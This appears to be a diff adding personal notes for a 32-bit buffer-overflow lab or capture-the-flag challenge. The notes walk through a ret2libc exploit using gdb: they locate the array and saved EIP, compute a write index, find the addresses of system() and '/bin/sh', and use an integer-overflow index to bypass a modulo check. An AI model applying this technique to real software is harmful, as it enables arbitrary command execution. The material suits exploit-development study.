@@ -1,0 +1,45 @@
+# 1. Find array address
+(gdb) b read_number
+(gdb) run
+(gdb) x $ebp+0x8
+//example   large_buffer 0xffffd500:	0xffffd524
+
+# 2. Find EIP address
+(gdb) b main
+(gdb) run
+(gdb) info frame
+
+// eip at 0xffffd6ec
+# 3. Calculate index
+index = (eip_address - array_address) / 4
+    0xffffd6ec - 0xffffd524 = 0x1C8 
+    0x1C8 / 4 = 114
+
+# 4. Find addresses
+(gdb) break main
+(gdb) run
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+python3 -c "print(int(0xf7e6aed0))"
+system() = 0xf7e6aed0 = 4159090384 
+
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f897ec
+"/bin/sh" = 0xf7f897ec = 4160264172 
+
+
+114 % 3 = 0  ❌ BLOCKED!
+UINT_MAX = 4294967296
+target = 114
+overflow = (UINT_MAX // 4) + target
+1073741938
+
+# 6. Exploit
+store → system_addr → overflow_index
+store → binsh_addr → target_index
+quit
+```
+
+
+
+-
